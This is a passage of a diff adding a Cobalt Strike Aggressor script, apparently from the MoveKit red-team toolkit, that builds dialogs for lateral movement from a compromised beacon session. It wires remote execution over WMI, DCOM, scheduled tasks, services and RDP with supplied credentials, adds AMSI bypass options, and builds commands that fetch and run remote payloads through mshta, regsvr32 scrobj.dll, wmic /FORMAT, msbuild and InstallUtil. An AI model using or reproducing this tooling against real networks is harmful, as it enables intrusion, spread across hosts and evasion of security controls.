@@ -1,0 +1,936 @@
+#
+#
+# MoveKit - Move Dialogs
+# by: @0xthirteen
+#
+#
+
+
+#---------------------------------------------
+#Misc Execution
+#---------------------------------------------
+sub moveDialogs::wmi{
+	local('$dialog $bid $creds $sharparg $cred')
+	$dialog = dialog("Windows Management Instrumentation Execution", %(bid => "", action => "create", query => "", computername => "", command => "", credential => "", amsi => "false"), lambda({
+		$bid = $3['bid'];
+		$creds = "";
+		$sharparg = "";
+		if($bid eq ""){
+			show_error("You did not specify a session");
+			break;
+		}
+		if($3['action'] eq "create"){
+			if($3['query'] ne ""){
+				berror($bid, "\c4Error: \c4If running create action specify a command not a query");
+				break;
+			}
+			else if($3['command'] eq ""){
+				berror($bid, "\c4Error: \c4If running create action specify a command");
+				break;
+			}
+			else if($3['computername'] eq ""){
+				berror($bid, "\c4Error: \c4Please specify a computername even if localhost");
+				break;				
+			}
+		}
+		else if($3['action'] eq "query"){
+			if($3['command'] ne ""){
+				berror($bid, "\c4Error: \c4If running query action specify a query not a command")
+				break;
+			}
+			else if($3['query'] eq ""){
+				berror($bid, "\c4Error: \c4If running query action specify a query")
+				break;				
+			}
+		}
+		else if($3['action'] eq 'executevbs'){
+			if($3['query'] ne "" && $3['command'] ne ""){
+				berror($bid, "\c4Error: \c4If running executevbs action do not specify a command or query");
+				break;
+			}
+			else if($3['computername'] eq ""){
+				berror($bid, "\c4Error: \c4Please specify a computername even if localhost");
+				break;
+			}
+		}
+		$sharparg = 'action=';
+		$sharparg .= $3['action'];
+		$sharparg .= ' ';
+		if($3['computername'] ne ""){
+			$sharparg .= 'computername=';
+			$sharparg .= $3['computername'];
+			$sharparg .= ' ';
+		}
+		if($3['command'] ne ""){
+			$sharparg .= 'command="';
+			$sharparg .= $3['command'];
+			$sharparg .= '" ';
+		}
+		if($3['query'] ne ""){
+			$sharparg .= 'query="';
+			$sharparg .= $3['query'];
+			$sharparg .= '" ';
+		}
+		if($3['amsi'] ne ""){
+			$sharparg .= 'amsi=';
+			$sharparg .= $3['amsi'];
+			$sharparg .= ' ';
+		}
+		if($3['credential'] ne ""){
+			$cred = moveKit::credentialparser($3['credential']);
+			$sharparg .= $cred;
+		}
+		binput($bid, "SharpMove SharpWMI Execution");
+		btask($bid, 'Executing SharpWMI');
+		btask($bid, "Executing $3['command']$3['query'] against $3['computername']");
+		bexecute_assembly!($bid, script_resource("Assemblies/SharpMove.exe"), $sharparg);
+	}));
+	dialog_description($dialog, "Custom WMI command or query");
+	drow_beacon($dialog, "bid", "Session: ");
+	drow_combobox($dialog, "action", "Action", @("create", "query"));
+	drow_text_big($dialog, 'query', "Query");
+	drow_text($dialog, 'computername', 'ComputerName');
+	drow_text_big($dialog, 'command', 'Command');
+	drow_text($dialog, 'credential', 'Credentials');
+	drow_checkbox($dialog, "amsi", "AMSI: ", "AMSI Bypass");
+	dbutton_action($dialog, "Execute");
+	dialog_show($dialog);
+}
+
+sub moveDialogs::dcom{
+	local('$dialog $bid $creds $sharparg $cred')
+	$dialog = dialog("Distributed Component Object Model Execution", %(bid => "", action => "create", computername => "", command => "", credential => "", amsi => "false"), lambda({
+		$bid = $3['bid'];
+		$creds = "";
+		$sharparg = "";
+		if($bid eq ""){
+			show_error("You did not specify a session");
+			break;
+		}
+		$sharparg = 'action=dcom ';
+		$sharparg .= 'method=';
+		$sharparg .= $3['method'];
+		$sharparg .= ' ';
+		if($3['computername'] ne ""){
+			$sharparg .= 'computername=';
+			$sharparg .= $3['computername'];
+			$sharparg .= ' ';
+		}
+		if($3['command'] ne ""){
+			$sharparg .= 'command="';
+			$sharparg .= $3['command'];
+			$sharparg .= '" ';
+		}
+		if($3['amsi'] ne ""){
+			$sharparg .= 'amsi=';
+			$sharparg .= $3['amsi'];
+			$sharparg .= ' ';
+		}
+		if($3['credential'] ne ""){
+			$cred = moveKit::credentialparser($3['credential']);
+			$sharparg .= $cred;
+		}
+		binput($bid, "SharpMove SharpDCOM Execution");
+		btask($bid, 'Executing SharpDCOM');
+		btask($bid, "Executing $3['command'] against $3['computername']");
+		bexecute_assembly!($bid, script_resource("Assemblies/SharpMove.exe"), $sharparg);
+	}));
+	dialog_description($dialog, "Custom DCOM command Execution");
+	drow_beacon($dialog, "bid", "Session: ");
+	drow_combobox($dialog, "method", "Method", @("ShellWindows", "MMC", "ShellBrowserWindow", "ExcelDDE"));
+	drow_text($dialog, 'computername', 'ComputerName');
+	drow_text_big($dialog, 'command', 'Command');
+	drow_text($dialog, 'credential', 'Credentials');
+	drow_checkbox($dialog, "amsi", "AMSI: ", "AMSI Bypass");
+	dbutton_action($dialog, "Execute");
+	dialog_show($dialog);
+}
+
+sub moveDialogs::taskschedule{
+	local('$dialog $bid $creds $sharparg $cred')
+	$dialog = dialog("Scheduled Task Execution", %(bid => "", taskname => "", command => "", computername => "", credential => "", amsi => "false"), lambda({
+		$bid = $3['bid'];
+		$creds = "";
+		$sharparg = "";
+		if($bid eq ""){
+			show_error("You did not specify a session");
+			break;
+		}
+		$sharparg = 'action=taskscheduler ';
+		if($3['computername'] ne ""){
+			$sharparg .= 'computername=';
+			$sharparg .= $3['computername'];
+			$sharparg .= ' ';
+		}
+		if($3['command'] ne ""){
+			$sharparg .= 'command="';
+			$sharparg .= $3['command'];
+			$sharparg .= '" ';
+		}
+		if($3['taskname'] ne ""){
+			$sharparg .= 'taskname=';
+			$sharparg .= $3['taskname'];
+			$sharparg .= ' ';
+		}
+		if($3['amsi'] ne ""){
+			$sharparg .= 'amsi=';
+			$sharparg .= $3['amsi'];
+			$sharparg .= ' ';
+		}
+		if($3['credential'] ne ""){
+			$cred = moveKit::credentialparser($3['credential']);
+			$sharparg .= $cred;
+		}
+		binput($bid, "SharpMove SharpTaskScheduler Execution");
+		btask($bid, 'Executing SharpTaskScheduler');
+		btask($bid, "Executing $3['command'] against $3['computername']");
+		bexecute_assembly!($bid, script_resource("Assemblies/SharpMove.exe"), $sharparg);
+	}));
+	dialog_description($dialog, "Custom Scheduled Task Execution");
+	drow_beacon($dialog, "bid", "Session: ");
+	drow_text($dialog, "taskname", "Task Name: ");
+	drow_text_big($dialog, 'command', 'Command');
+	drow_text($dialog, 'computername', 'ComputerName');
+	drow_text($dialog, 'credential', 'Credentials');
+	drow_checkbox($dialog, "amsi", "AMSI: ", "AMSI Bypass");
+	dbutton_action($dialog, "Execute");
+	dialog_show($dialog);
+}
+
+sub moveDialogs::scm{
+	local('$dialog $bid $creds $sharparg $cred')
+	$dialog = dialog("Service Control Manager Execution", %(bid => "", servicename => "", command => "", computername => "", credential => "", amsi => "false"), lambda({
+		$bid = $3['bid'];
+		$creds = "";
+		$sharparg = "";
+		if($bid eq ""){
+			show_error("You did not specify a session");
+			break;
+		}
+		$sharparg = 'action=scm ';
+		if($3['computername'] ne ""){
+			$sharparg .= 'computername=';
+			$sharparg .= $3['computername'];
+			$sharparg .= ' ';
+		}
+		if($3['command'] ne ""){
+			$sharparg .= 'command="';
+			$sharparg .= $3['command'];
+			$sharparg .= '" ';
+		}
+		if($3['servicename'] ne ""){
+			$sharparg .= 'servicename=';
+			$sharparg .= $3['servicename'];
+			$sharparg .= ' ';
+		}
+		if($3['amsi'] ne ""){
+			$sharparg .= 'amsi=';
+			$sharparg .= $3['amsi'];
+			$sharparg .= ' ';
+		}
+		if($3['credential'] ne ""){
+			$cred = moveKit::credentialparser($3['credential']);
+			$sharparg .= $cred;
+		}
+		binput($bid, "SharpMove SharpSCM Execution");
+		btask($bid, 'Executing SharpSCM');
+		btask($bid, "Executing $3['command'] against $3['computername']");
+		bexecute_assembly!($bid, script_resource("Assemblies/SharpMove.exe"), $sharparg);
+	}));
+	dialog_description($dialog, "Custom Service Execution");
+	drow_beacon($dialog, "bid", "Session: ");
+	drow_text($dialog, "servicename", "Service Name: ");
+	drow_text_big($dialog, 'command', 'Command');
+	drow_text($dialog, 'computername', 'ComputerName');
+	drow_text($dialog, 'credential', 'Credentials');
+	drow_checkbox($dialog, "amsi", "AMSI: ", "AMSI Bypass");
+	dbutton_action($dialog, "Execute");
+	dialog_show($dialog);
+}
+
+sub moveDialogs::rdp{
+	local('$dialog $bid $creds $sharparg $cred')
+	$dialog = dialog("Remote Desktop Protocol Execution", %(bid => "", computername => "", command => "", credential => "", exec => ""), lambda({
+		$bid = $3['bid'];
+		$creds = "";
+		$sharparg = "";
+		if($bid eq ""){
+			show_error("You did not specify a session");
+			break;
+		}
+		if($3['computername'] eq ""){
+			berror($bid, "\c4Error: \c4Please specify a computername even if localhost");
+			break;
+		}
+		if($3['credential'] eq ""){
+			berror($bid, "\c4Error: \c4Please specify credentials");
+			break;
+		}
+		if($3['computername'] ne ""){
+			$sharparg .= 'computername=';
+			$sharparg .= $3['computername'];
+			$sharparg .= ' ';
+		}
+		if($3['command'] ne ""){
+			$sharparg .= 'command="';
+			$sharparg .= $3['command'];
+			$sharparg .= '" ';
+		}
+		if(($3['exec'] eq "Win\+R") || ($3['exec'] ne "")){
+			$sharparg .= 'exec="';
+			$sharparg .= $3['exec'];
+			$sharparg .= '" ';
+		}
+		if($3['credential'] ne ""){
+			$cred = moveKit::credentialparser($3['credential']);
+			$sharparg .= $cred;
+		}
+		binput($bid, "SharpMove SharpRDP Execution");
+		btask($bid, 'Executing SharpRDP');
+		btask($bid, "Executing $3['command'] against $3['computername']");
+		bexecute_assembly!($bid, script_resource("Assemblies/SharpRDP.exe"), $sharparg);
+	}));
+	dialog_description($dialog, "Custom RDP Command Execution");
+	drow_beacon($dialog, "bid", "Session: ");
+	drow_text($dialog, 'computername', 'ComputerName');
+	drow_text_big($dialog, 'command', 'Command');
+	drow_combobox($dialog, "exec", "Exec Method: ", @("Win+R", "Cmd", "PowerShell"));
+	drow_text($dialog, 'credential', 'Credentials');
+	dbutton_action($dialog, "Execute");
+	dialog_show($dialog);
+}
+
+sub moveDialogs::modifyscheduledtask{
+	local('$dialog $bid $creds $sharparg $cred')
+	$dialog = dialog("Modify Existing Scheduled Task Execution", %(bid => "", taskname => "", command => "", computername => "", credential => "", amsi => "false"), lambda({
+		$bid = $3['bid'];
+		$creds = "";
+		$sharparg = "";
+		if($bid eq ""){
+			show_error("You did not specify a session");
+			break;
+		}
+		$sharparg = 'action=modschtask ';
+		if($3['computername'] ne ""){
+			$sharparg .= 'computername=';
+			$sharparg .= $3['computername'];
+			$sharparg .= ' ';
+		}
+		if($3['command'] ne ""){
+			$sharparg .= 'command="';
+			$sharparg .= $3['command'];
+			$sharparg .= '" ';
+		}
+		if($3['taskname'] ne ""){
+			$sharparg .= 'taskname=';
+			$sharparg .= $3['taskname'];
+			$sharparg .= ' ';
+		}
+		if($3['amsi'] ne ""){
+			$sharparg .= 'amsi=';
+			$sharparg .= $3['amsi'];
+			$sharparg .= ' ';
+		}
+		if($3['credential'] ne ""){
+			$cred = moveKit::credentialparser($3['credential']);
+			$sharparg .= $cred;
+		}
+		binput($bid, "SharpMove Modify-SharpTaskScheduler Execution");
+		btask($bid, 'Executing Modify-SharpTaskScheduler');
+		btask($bid, "Executing $3['command'] against $3['computername']");
+		bexecute_assembly!($bid, script_resource("Assemblies/SharpMove.exe"), $sharparg);
+	}));
+	dialog_description($dialog, "Modify Existing Scheduled Task Execution");
+	drow_beacon($dialog, "bid", "Session: ");
+	drow_text($dialog, "taskname", "Task Name: ");
+	drow_text_big($dialog, 'command', 'Command');
+	drow_text($dialog, 'computername', 'ComputerName');
+	drow_text($dialog, 'credential', 'Credentials');
+	drow_checkbox($dialog, "amsi", "AMSI: ", "AMSI Bypass");
+	dbutton_action($dialog, "Execute");
+	dialog_show($dialog);
+}
+
+sub moveDialogs::modifyservice{
+	local('$dialog $bid $creds $sharparg $cred')
+	$dialog = dialog("Modify Existing Service Execution", %(bid => "", servicename => "", command => "", computername => "", credential => "", amsi => "false"), lambda({
+		$bid = $3['bid'];
+		$creds = "";
+		$sharparg = "";
+		if($bid eq ""){
+			show_error("You did not specify a session");
+			break;
+		}
+		$sharparg = 'action=modsvc ';
+		if($3['computername'] ne ""){
+			$sharparg .= 'computername=';
+			$sharparg .= $3['computername'];
+			$sharparg .= ' ';
+		}
+		if($3['command'] ne ""){
+			$sharparg .= 'command="';
+			$sharparg .= $3['command'];
+			$sharparg .= '" ';
+		}
+		if($3['servicename'] ne ""){
+			$sharparg .= 'servicename=';
+			$sharparg .= $3['servicename'];
+			$sharparg .= ' ';
+		}
+		if($3['amsi'] ne ""){
+			$sharparg .= 'amsi=';
+			$sharparg .= $3['amsi'];
+			$sharparg .= ' ';
+		}
+		if($3['credential'] ne ""){
+			$cred = moveKit::credentialparser($3['credential']);
+			$sharparg .= $cred;
+		}
+		binput($bid, "SharpMove Modify-SharpService Execution");
+		btask($bid, 'Executing Modify-SharpService');
+		btask($bid, "Executing $3['command'] against $3['computername']");
+		bexecute_assembly!($bid, script_resource("Assemblies/SharpMove.exe"), $sharparg);
+	}));
+	dialog_description($dialog, "Modify Existing Service binpath Execution");
+	drow_beacon($dialog, "bid", "Session: ");
+	drow_text($dialog, "servicename", "Service Name: ");
+	drow_text_big($dialog, 'command', 'Command');
+	drow_text($dialog, 'computername', 'ComputerName');
+	drow_text($dialog, 'credential', 'Credentials');
+	drow_checkbox($dialog, "amsi", "AMSI: ", "AMSI Bypass");
+	dbutton_action($dialog, "Execute");
+	dialog_show($dialog);
+}
+
+#---------------------------------------------
+#Shellcode Execution
+#---------------------------------------------
+sub moveDialogs::eventsubexec{
+	local('$payloadtype $descname $exectemplate $compile $latcommand $cmdarch');
+	$dialog = dialog("Lateral Movement - WMI Event Subscription", %(bid => "", listener => "", computername => "", credential => "", x86 => %moveKit::movedefaults["x86"], staged => %moveKit::movedefaults["staged"]), lambda({
+		$payloadtype = "raw";
+		$compile = "false";
+		$descname = "Shellcode-WMIEventSub";
+		$exectemplate = "";
+		show_message("Coming soon :)");
+		exit();
+		&moveKit::prechecks($3['bid'], $3['listener'], $descname, $2, "", $null, $3['computername'], "file", "cmd", $null);
+		&moveKit::bearings($3, $null, $payloadtype, $compile, $descname, $exectemplate);
+	}));
+	dialog_description($dialog, "Leverage WMI Event Subscription with GadgetToJscript for lateral movement");
+	drow_beacon($dialog, "bid", "Session: ");
+	drow_listener($dialog, "listener", "Listener: ");
+	drow_text($dialog, "computername", 'TargetHost: ');
+	drow_text($dialog, "credential", 'Credentials: ');
+	drow_checkbox($dialog, "x86", "x86: ", "Use x86 arch payload");
+	drow_checkbox($dialog, "staged", "Staged: ", "Use staged payload");
+	dbutton_action($dialog, "Execute");
+	dbutton_action($dialog, "Help");
+	dialog_show($dialog);
+}
+
+sub moveDialogs::exceldcomexec{
+	local('$payloadtype $descname $exectemplate $compile $latcommand $cmdarch');
+	$dialog = dialog("Lateral Movement - Excel 4.0 DCOM", %(bid => "", listener => "", computername => "", credential => "", x86 => %moveKit::movedefaults["x86"], staged => %moveKit::movedefaults["staged"]), lambda({
+		$payloadtype = "raw";
+		$compile = "true";
+		$descname = "Shellcode-ExcelDCOM";
+		$exectemplate = "";
+		&moveKit::prechecks($3['bid'], $3['listener'], $descname, $2, "", $null, $3['computername'], "file", "cmd", $null);
+		&moveKit::bearings($3, $null, $payloadtype, $compile, $descname, $exectemplate);
+	}));
+	dialog_description($dialog, "Leverage Excel 4.0 DCOM Server for lateral movement");
+	drow_beacon($dialog, "bid", "Session: ");
+	drow_listener($dialog, "listener", "Listener: ");
+	drow_text($dialog, "computername", 'TargetHost: ');
+	drow_text($dialog, "credential", 'Credentials: ');
+	drow_checkbox($dialog, "x86", "x86: ", "Use x86 arch payload");
+	drow_checkbox($dialog, "staged", "Staged: ", "Use staged payload");
+	dbutton_action($dialog, "Execute");
+	dbutton_action($dialog, "Help");
+	dialog_show($dialog);
+}
+
+#---------------------------------------------
+#Commands
+#---------------------------------------------
+sub moveDialogs::mshta_cmd{
+	local('$payloadtype $descname $exectemplate $compile $latcommand $cmdarch');
+	$dialog = dialog("Lateral Movement - MSHTA Command", %(bid => "", listener => "", location => %moveKit::movedefaults["location"], computername => "", credential => "", x86 => %moveKit::movedefaults["x86"], cmdtrigger => %moveKit::movedefaults["cmdtrigger"], staged => %moveKit::movedefaults["staged"], amsi => %moveKit::movedefaults["amsi"], auto => %moveKit::movedefaults["auto"]), lambda({
+		$payloadtype = "raw";
+		$compile = "false";
+		$descname = "MSHTA-Command Lateral Movement";
+		$exectemplate = "mshta.hta";
+		&moveKit::prechecks($3['bid'], $3['listener'], $descname, $2, "", $3['location'], $3['computername'], "file", "cmd", $3['auto']);
+
+		#Can't used env vars
+		if($3['x86'] eq "false"){
+			$cmdarch = "C:\\Windows\\System32\\mshta.exe ";
+		}
+		else {
+			$cmdarch = "C:\\Windows\\SysWOW64\\mshta.exe ";
+		}
+		$latcommand = "". $cmdarch . "" . $3['location'] . "";
+		&moveKit::bearings($3, $latcommand, $payloadtype, $compile, $descname, $exectemplate);
+	}));
+	dialog_description($dialog, "Leverage MSHTA Command for lateral movement");
+	drow_beacon($dialog, "bid", "Session: ");
+	drow_listener($dialog, "listener", "Listener: ");
+	drow_combobox($dialog, "cmdtrigger", "Command Trigger: ", @("WMI", "RDP", "SCM", "SCHTASK", "ModifySchTask", "ModifyService", "DCOM ShellWindows", "DCOM MMC", "DCOM ShellBrowserWindow", "DCOM ExcelDDE"));
+	drow_text($dialog, "location", "File URL: ");
+	drow_text($dialog, "computername", 'TargetHost: ');
+	drow_text($dialog, "credential", 'Credentials: ');
+	drow_checkbox($dialog, "auto", "Auto: ", "Auto Host file");
+	drow_checkbox($dialog, "x86", "x86: ", "Use x86 arch payload");
+	drow_checkbox($dialog, "staged", "Staged: ", "Use staged payload");
+	drow_checkbox($dialog, "amsi", "AMSI: ", "AMSI Bypass");
+	dbutton_action($dialog, "Execute");
+	dbutton_action($dialog, "Help");
+	dialog_show($dialog);
+}
+
+sub moveDialogs::regsvr32_cmd{
+	local('$payloadtype $descname $exectemplate $compile $latcommand $cmdarch');
+	$dialog = dialog("Lateral Movement - RegSvr32 Command", %(bid => "", listener => "", location => %moveKit::movedefaults["location"], computername => "", credential => "", x86 => %moveKit::movedefaults["x86"], cmdtrigger => %moveKit::movedefaults["cmdtrigger"], staged => %moveKit::movedefaults["staged"], amsi => %moveKit::movedefaults["amsi"], auto => %moveKit::movedefaults["auto"]), lambda({
+		$payloadtype = "raw";
+		$compile = "false";
+		$descname = "RegSvr32-Command Lateral Movement";
+		$exectemplate = "regsvr32.sct";
+		&moveKit::prechecks($3['bid'], $3['listener'], $descname, $2, "", $3['location'], $3['computername'], "file", "cmd", $3['auto']);
+		
+		#Can't used env vars
+		if($3['x86'] eq "false"){
+			$cmdarch = "C:\\Windows\\System32\\regsvr32.exe ";
+		}
+		else {
+			$cmdarch = "C:\\Windows\\SysWOW64\\regsvr32.exe ";
+		}
+		$latcommand = "". $cmdarch . "/s /n /u /i:" . $3['location'] . " scrobj.dll";
+		&moveKit::bearings($3, $latcommand, $payloadtype, $compile, $descname, $exectemplate);
+	}));
+	dialog_description($dialog, "Leverage RegSvr32 Command for lateral movement");
+	drow_beacon($dialog, "bid", "Session: ");
+	drow_listener($dialog, "listener", "Listener: ");
+	drow_combobox($dialog, "cmdtrigger", "Command Trigger: ", @("WMI", "RDP", "SCM", "SCHTASK", "ModifySchTask", "ModifyService", "DCOM ShellWindows", "DCOM MMC", "DCOM ShellBrowserWindow", "DCOM ExcelDDE"));
+	drow_text($dialog, "location", "File URL: ");
+	drow_text($dialog, "computername", 'TargetHost: ');
+	drow_text($dialog, "credential", 'Credentials: ');
+	drow_checkbox($dialog, "auto", "Auto: ", "Auto Host file");
+	drow_checkbox($dialog, "x86", "x86: ", "Use x86 arch payload");
+	drow_checkbox($dialog, "staged", "Staged: ", "Use staged payload");
+	drow_checkbox($dialog, "amsi", "AMSI: ", "AMSI Bypass");
+	dbutton_action($dialog, "Execute");
+	dbutton_action($dialog, "Help");
+	dialog_show($dialog);
+}
+
+sub moveDialogs::wmic_cmd{
+	local('$payloadtype $descname $exectemplate $compile $latcommand $cmdarch');
+	$dialog = dialog("Lateral Movement - WMIC Command", %(bid => "", listener => "", location => %moveKit::movedefaults["location"], computername => "", credential => "", x86 => %moveKit::movedefaults["x86"], cmdtrigger => %moveKit::movedefaults["cmdtrigger"], staged => %moveKit::movedefaults["staged"], amsi => %moveKit::movedefaults["amsi"], auto => %moveKit::movedefaults["auto"]), lambda({
+		$payloadtype = "raw";
+		$compile = "false";
+		$descname = "WMIC-Command Lateral Movement";
+		$exectemplate = "wmic.xsl";
+		&moveKit::prechecks($3['bid'], $3['listener'], $descname, $2, "", $3['location'], $3['computername'], "file", "cmd", $3['auto']);
+		
+		#Can't used env vars
+		if($3['x86'] eq "false"){
+			$cmdarch = "C:\\Windows\\System32\\wbem\\wmic.exe ";
+		}
+		else {
+			$cmdarch = "C:\\Windows\\SysWOW64\\wbem\\wmic.exe ";
+		}
+		$latcommand = "". $cmdarch . "os get name /FORMAT:" . $3['location'] . "";
+		&moveKit::bearings($3, $latcommand, $payloadtype, $compile, $descname, $exectemplate);
+	}));
+	dialog_description($dialog, "Leverage WMIC Command for lateral movement");
+	drow_beacon($dialog, "bid", "Session: ");
+	drow_listener($dialog, "listener", "Listener: ");
+	drow_combobox($dialog, "cmdtrigger", "Command Trigger: ", @("WMI", "RDP", "SCM", "SCHTASK", "ModifySchTask", "ModifyService", "DCOM ShellWindows", "DCOM MMC", "DCOM ShellBrowserWindow", "DCOM ExcelDDE"));
+	drow_text($dialog, "location", "File URL: ");
+	drow_text($dialog, "computername", 'TargetHost: ');
+	drow_text($dialog, "credential", 'Credentials: ');
+	drow_checkbox($dialog, "auto", "Auto: ", "Auto Host file");
+	drow_checkbox($dialog, "x86", "x86: ", "Use x86 arch payload");
+	drow_checkbox($dialog, "staged", "Staged: ", "Use staged payload");
+	drow_checkbox($dialog, "amsi", "AMSI: ", "AMSI Bypass");
+	dbutton_action($dialog, "Execute");
+	dbutton_action($dialog, "Help");
+	dialog_show($dialog);
+}
+
+#---------------------------------------------
+#Files
+#---------------------------------------------
+sub moveDialogs::msbuild{
+	local('$payloadtype $descname $exectemplate $compile $latcommand $cmdarch $opts');
+	$dialog = dialog("Lateral Movement - MSBuild", %(bid => "", listener => "", droptype => %moveKit::movedefaults["droptype"], cmdtrigger => %moveKit::movedefaults["cmdtrigger"], location => %moveKit::movedefaults["location"], droplocation => %moveKit::movedefaults["droplocation"], filename => "moveme.csproj", eventname => %moveKit::movedefaults["eventname"], computername => "", credential => "", x86 => %moveKit::movedefaults["x86"], amsi => %moveKit::movedefaults["amsi"], staged => %moveKit::movedefaults["staged"], auto => %moveKit::movedefaults["auto"]), lambda({
+		$payloadtype = "raw";
+		$compile = "false";
+		$descname = "MSBuild Lateral Movement";
+		$exectemplate = "msbuild.csproj";
+		$opts = $3;
+		&moveKit::prechecks($3['bid'], $3['listener'], $descname, $2, $3['droptype'], $3['location'], $3['computername'], $3['filename'], $3['cmdtrigger'], $3['auto']);
+		#Can't used env vars
+		if($3['x86'] eq "false"){
+			$cmdarch = "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\msbuild.exe ";
+		}
+		else {
+			$cmdarch = "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\msbuild.exe ";
+		}
+		if(($3['cmdtrigger'] eq "SCM") || ($3['cmdtrigger'] eq "ModifyService")){
+			$latcommand = "C:\\WINDOWS\\System32\\cmd.exe /c ". $cmdarch . "" . $3['droplocation'] ."\\" . $3['filename'] . "";
+			prompt_confirm("WARNING: Using this technique will force spawning cmd.exe and your command as a child process\nDo you want to continue?", "Usage warning", { &moveKit::bearings($opts, $latcommand, $payloadtype, $compile, $descname, $exectemplate); });
+		}
+		else{
+			$latcommand = "". $cmdarch . "" . $3['droplocation'] ."\\" . $3['filename'] . "";
+			&moveKit::bearings($3, $latcommand, $payloadtype, $compile, $descname, $exectemplate);
+		}
+	}));
+	dialog_description($dialog, "Leverage MSBuild for lateral movement");
+	drow_beacon($dialog, "bid", "Session: ");
+	drow_listener_stage($dialog, "listener", "Listener: ");
+	drow_combobox($dialog, "droptype", "File Drop Method: ", @("WMI", "SMB"));
+	drow_combobox($dialog, "cmdtrigger", "Command Trigger: ", @("WMI", "RDP", "SCM", "SCHTASK", "ModifySchTask", "ModifyService", "DCOM ShellWindows", "DCOM MMC", "DCOM ShellBrowserWindow", "DCOM ExcelDDE"));
+	drow_text($dialog, "location", "Location: ");
+	drow_text($dialog, "droplocation", "DropLocation: ");
+	drow_text($dialog, "filename", "DropFileName: ");
+	drow_text($dialog, "eventname", "Evt/Tsk/Svc Name: ");
+	drow_text($dialog, 'computername', 'TargetHost: ');
+	drow_text($dialog, 'credential', 'Credentials: ');
+	drow_checkbox($dialog, "auto", "Auto: ", "Auto Host or Move file");
+	drow_checkbox($dialog, "x86", "x86: ", "Use x86 arch payload");
+	drow_checkbox($dialog, "amsi", "AMSI: ", "AMSI Bypass");
+	drow_checkbox($dialog, "staged", "Staged: ", "Use staged payload");
+	dbutton_action($dialog, "Execute");
+	dbutton_action($dialog, "Help");
+	dialog_show($dialog);
+}
+
+sub moveDialogs::installutil{
+	local('$handle $pldata $payloadtype $sharptask $descname $exectemplate $smbmatch');
+	$dialog = dialog("Lateral Movement - InstallUtil", %(bid => "", listener => "", droptype => %moveKit::movedefaults["droptype"], cmdtrigger => %moveKit::movedefaults["cmdtrigger"], location => %moveKit::movedefaults["location"], droplocation => %moveKit::movedefaults["droplocation"], filename => "moveme.exe", eventname => %moveKit::movedefaults["eventname"], computername => "", credential => "", x86 => %moveKit::movedefaults["x86"], amsi => %moveKit::movedefaults["amsi"], staged => %moveKit::movedefaults["staged"], auto => %moveKit::movedefaults["auto"]), lambda({
+		$sharptask = "";
+		$payloadtype = "raw";
+		$compile = "true";
+		$descname = "InstallUtil Lateral Movement";
+		$exectemplate = "installutil.cs";
+		$opts = $3;
+		&moveKit::prechecks($3['bid'], $3['listener'], $descname, $2, $3['droptype'], $3['location'], $3['computername'], $3['filename'], $3['cmdtrigger'], $3['auto']);
+		#Can't used env vars
+		if($3['x86'] eq "false"){
+			$cmdarch = "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\InstallUtil.exe ";
+		}
+		else {
+			$cmdarch = "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\InstallUtil.exe ";
+		}
+		$extras = "/logfile= /LogToConsole=false /U "; 
+		if(($3['cmdtrigger'] eq "SCM") || ($3['cmdtrigger'] eq "ModifyService")){
+			$latcommand = "C:\\WINDOWS\\System32\\cmd.exe /c ". $cmdarch . "$extras" . $3['droplocation'] ."\\" . $3['filename'] . "";
+			prompt_confirm("WARNING: Using this technique will force spawning cmd.exe and your command as a child process\nDo you want to continue?", "Usage warning", { &moveKit::bearings($opts, $latcommand, $payloadtype, $compile, $descname, $exectemplate); });
+		}
+		else{
+			$latcommand = "". $cmdarch . "$extras" . $3['droplocation'] ."\\" . $3['filename'] . "";
+			&moveKit::bearings($3, $latcommand, $payloadtype, $compile, $descname, $exectemplate);
+		}
+
+	}));
+	dialog_description($dialog, "Leverage InstallUtil for lateral movement");
+	drow_beacon($dialog, "bid", "Session: ");
+	drow_listener_stage($dialog, "listener", "Listener: ");
+	drow_combobox($dialog, "droptype", "File Drop Method: ", @("WMI", "SMB"));
+	drow_combobox($dialog, "cmdtrigger", "Command Trigger: ", @("WMI", "RDP", "SCM", "SCHTASK", "ModifySchTask", "ModifyService", "DCOM ShellWindows", "DCOM MMC", "DCOM ShellBrowserWindow", "DCOM ExcelDDE"));
+	drow_text($dialog, "location", "Location: ");
+	drow_text($dialog, "droplocation", "DropLocation: ");
+	drow_text($dialog, "filename", "DropFileName: ");
+	drow_text($dialog, "eventname", "EventName: ");
+	drow_text($dialog, 'computername', 'TargetHost: ');
+	drow_text($dialog, 'credential', 'Credentials: ');
+	drow_checkbox($dialog, "auto", "Auto: ", "Auto Host or Move file");
+	drow_checkbox($dialog, "x86", "x86: ", "Use x86 arch payload");
+	drow_checkbox($dialog, "amsi", "AMSI: ", "AMSI Bypass");
+	drow_checkbox($dialog, "staged", "Staged: ", "Use staged payload");
+	dbutton_action($dialog, "Execute");
+	dialog_show($dialog);
+}
+
+sub moveDialogs::mshta_file{
+	local('$handle $pldata $payloadtype $sharptask $descname');
+	$dialog = dialog("Lateral Movement - MSHTA File", %(bid => "", listener => "", droptype => %moveKit::movedefaults["droptype"], cmdtrigger => %moveKit::movedefaults["cmdtrigger"], location => %moveKit::movedefaults["location"], droplocation => %moveKit::movedefaults["droplocation"], filename => "moveme.hta", eventname => %moveKit::movedefaults["eventname"], computername => "", credential => "", x86 => %moveKit::movedefaults["x86"], amsi => %moveKit::movedefaults["amsi"], staged => %moveKit::movedefaults["staged"], auto => %moveKit::movedefaults["auto"]), lambda({
+		$sharptask = "";
+		$payloadtype = "raw";
+		$compile = "false";
+		$descname = "MSHTA Lateral Movement";
+		$exectemplate = "mshta.hta";
+		$opts = $3;
+		&moveKit::prechecks($3['bid'], $3['listener'], $descname, $2, $3['droptype'], $3['location'], $3['computername'], $3['filename'], $3['cmdtrigger'], $3['auto']);
+		#Can't used env vars
+		if($3['x86'] eq "false"){
+			$cmdarch = "C:\\Windows\\System32\\mshta.exe ";
+		}
+		else {
+			$cmdarch = "C:\\Windows\\SysWOW64\\mshta.exe ";
+		}
+		if(($3['cmdtrigger'] eq "SCM") || ($3['cmdtrigger'] eq "ModifyService")){
+			$latcommand = "C:\\WINDOWS\\System32\\cmd.exe /c ". $cmdarch . "" . $3['droplocation'] ."\\" . $3['filename'] . "";
